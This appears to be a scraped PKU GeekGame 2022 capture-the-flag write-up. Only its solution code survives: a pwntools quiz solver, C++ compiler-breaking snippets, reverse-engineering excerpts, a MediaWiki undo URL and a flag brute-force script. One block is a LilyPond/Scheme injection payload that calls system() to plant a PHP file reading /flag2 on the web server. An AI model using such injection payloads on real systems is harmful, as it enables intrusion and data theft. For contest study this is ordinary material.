# PKU GeekGame 2022 题解

> 原文: https://www.ctfiot.com/78943.html
> ID: 78943


```
1
2
s = """原文"""
print(''.join(map(lambda x: x[0] + x[1], zip(*s.split('\n')))))
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
from pwn import *
import re

HOST = "prob01.geekgame.pku.edu.cn"
PORT = 10001
TOKEN = rb""

def solve(line):
 if 'PKU Runner' in line:
 return b'cn.edu.pku.pkurunner'
 if 'gStore' in line:
 return b'10.14778/2002974.2002976'
 if 'ctf' in line:
 return b'ctf.xn--4gqwbu44czhc7w9a66k.com'
 if 'WebP' in line:
 return b'65'
 if 'BV1EV411s7vu' in line:
 return b'418645518'
 if 'd2:94:35:21:42:43' in line:
 return b'80304'
 mg = re.match(
 r"第 [0-9] 题：在第一届 PKU GeekGame 比赛的题目《电子游戏概论》中，通过第 ([0-9]+) 级关卡需要多少金钱？",
 line)
 if mg:
 level = int(mg.group(1))
 return str(300 + int(level**1.5) * 100).encode('utf8')

 return ''

if __name__ == "__main__":
 r = connect(HOST, PORT)

 r.sendlineafter(b"Please input your token: ", TOKEN, 1)
 r.sendlineafter(b"> ", "急急急".encode('utf8'))

 print('[+] Got connection.')

 for idx in range(7):
 prob = r.recvline_startswith(
 '第'.encode('utf8')).decode('utf8').strip('\n')
 ans = solve(prob)
 if len(ans) == 0:
 print('[!] Invalid problem.')
 print(f'[!] Problem: {prob}')
 exit(0)

 r.sendlineafter(b"> ", ans)
 line = r.recvline()
 if line.decode('utf8').strip('\n') != "鉴定为：答案正确。":
 print('[!] Fatal!')
 print(f'[!] Problem: {prob}')
 print(f'[!] Answer: {ans.decode("utf8")}')
 print(f'[!] Predict: {line.decode("utf8")}')
 exit(0)

 print(f'[+] Problem {idx+1}: success.')

 print(f'[+] All done!')
 print(f'[+] Remain: {r.recvall().decode("utf8")}')
1
2
3
long long array[2000000]{1};
int main() { return 0; }
//EOF
1
2
3
    #include __FILE__
    #include __FILE__
//EOF
1
2
3
void operator""_x(const char *, unsigned long);
static_assert(false, "foo"_x);
//EOF
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
// codes...

ScriptEngineManager var2 = new ScriptEngineManager();
ScriptEngine var3 = var2.getEngineByName("nashorn");

try {
 String var4 = "";
 StringBuilder var8 = new StringBuilder();

 for(int var9 = 0; var9 < var4.length(); ++var9) {
 var8.append((char)(var4.charAt(var9) ^ 239));
 }

 var3.eval(var8.toString());
}

// codes...
else {
 Object var6 = this.invocable.invokeFunction(var1.getSource() == this.button2 ? "checkflag2" : "checkflag3", new Object[]{this.textField1.getText()});
}

// codes...
1
2
3
function checkflag2(input) {
 return (JSON.stringify(input.split('').map(function (x) { return x.charCodeAt(0) })) == JSON.stringify([0, 15, 16, 17, 30, 105, 16, 31, 16, 67, 3, 33, 5, 60, 4, 106, 6, 41, 0, 1, 67, 3, 16, 4, 6, 33, 232].map(function (x) { return (checkflag2 + '').charAt(x) })) ? 'Correct' : 'Wrong')
}
1
https://prob07-<env>.geekgame.pku.edu.cn/index.php?title=%E9%A6%96%E9%A1%B5&action=mcrundo&undo=1&undoafter=2
1
2
3
4
5
<score>\new Staff <<{c^#

(object->string (system "echo \"<?php echo file_get_contents('/flag2') ?>\" > /var/www/html/test.php"))

}>></score>
1
2
3
if (localStorage.getItem('i_am_premium_user') === 'true') {
 import('./main-premium.js')
}
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
from string import printable

B = 2511413510786744827187994827731403682185299073590935188882

def hl(num: int) -> int:
 return len(hex(num)) - 2

def gl(num: int) -> int:
 return (B >> ((hl(B) - hl(num)) * 4)) ^ num

def verify(num: int) -> bool:
 l = hl(num)
 for i in range(1, l + 1):
 if (num >> ((l - i) * 4)) % i > 0:
 return False

 return True

def dfs(cur):
 if hl(cur) == 48:
 if cur % 256 == ord('}'):
 return cur
 for i in printable[:-6]:
 nxt = (cur << 8) + ord(i)
 if verify(gl(nxt)):
 if (ret := dfs(nxt)) > 0:
 return ret

 return -1

if __name__ == "__main__":
 num = 0x666c61677b # flag{
 print(dfs(num).to_bytes(24, 'big'))
```
